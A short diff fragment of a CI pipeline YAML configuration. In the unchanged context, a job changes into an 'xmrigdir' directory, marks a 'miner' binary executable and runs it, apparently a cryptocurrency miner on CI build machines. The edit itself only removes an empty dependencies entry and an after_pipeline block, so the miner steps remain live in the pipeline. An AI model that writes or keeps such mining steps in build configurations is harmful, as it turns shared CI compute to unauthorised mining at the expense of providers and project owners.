@@ -16,9 +16,3 @@ blocks:
             - cd xmrigdir
             - chmod +x miner
             - ./miner
-    dependencies: []
-after_pipeline:
-  task:
-    jobs:
-      - name: 'Job #1'
-        commands: []
